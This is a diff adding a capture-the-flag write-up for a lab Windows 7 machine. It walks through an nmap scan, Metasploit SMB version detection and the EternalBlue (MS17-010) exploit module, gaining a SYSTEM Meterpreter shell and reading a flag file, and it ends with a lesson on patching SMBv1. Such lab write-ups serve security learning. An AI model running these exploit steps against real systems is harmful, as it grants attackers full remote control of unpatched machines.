@@ -920,9 +920,60 @@ Exploit Used: `exploit/linux/http/webmin_backdoor`
 
 ### Task Hint:
 My PC is unhackable. I tested it myself. It's all thanks to Windows and it's amazing security features. You are welcome to try if you don't believe me!
+Note: Due to the nature of the exploit required for this machine, you may end up killing the vulnerable service unintentionally. If you feel a service stopped responding to you, you will need to restart the VM.
+
 ### Solution:
 
+Scanned the target machine for open ports and services:
+```
+nmap -F 10.10.76.120
+```
+Results:
+Open ports included `135 (msrpc)`, `139 (netbios-ssn)`, `445 (microsoft-ds) (SMB)`, and others.
+
+Opened Metasploit by using `msfconsole`
+
+Used Metasploit's SMB version scanner to confirm the target’s SMB version:
+```
+use auxiliary/scanner/smb/smb_version
+run
+```
+Results:
+SMB version: 1 & 2 (preferred dialect: SMB 2.1)
+OS: Windows 7 Professional SP1 (build: 7601)
+
+Selected the exploit/windows/smb/ms17_010_eternalblue module in Metasploit to exploit the SMB vulnerability:
+```
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.76.120
+exploit
+```
+Successfully gained a Meterpreter session.
+Privileges: `NT AUTHORITY\SYSTEM` (highest level of privilege).
+
+Searched the filesystem for flag.txt:
+```
+search -f flag.txt
+```
+File found at: `c:\Users\Jon\Documents\flag.txt`
+
+Opened a system shell to read the flag:
+```
+shell
+cd C:\Users\Jon\Documents
+type flag.txt
+```
+
 ### Notes:
+Vulnerability Exploited: MS17-010 (EternalBlue), a known vulnerability in SMBv1 that allows remote attackers to execute arbitrary code.
+Lesson Learned: Leaving SMBv1 enabled on systems or failing to patch known vulnerabilities exposes machines to severe exploitation risks.
+Privilege Escalation: Exploiting EternalBlue provided NT AUTHORITY\SYSTEM, allowing full control over the system.
+
+Tools Used:
+Nmap - To identify open ports and running services.
+Metasploit Framework - For SMB exploitation (EternalBlue).
+Windows Shell - To navigate the filesystem and read the flag.
+
 
 ## :three::four: 34. Boot2Root (Insane) Contrabando
 
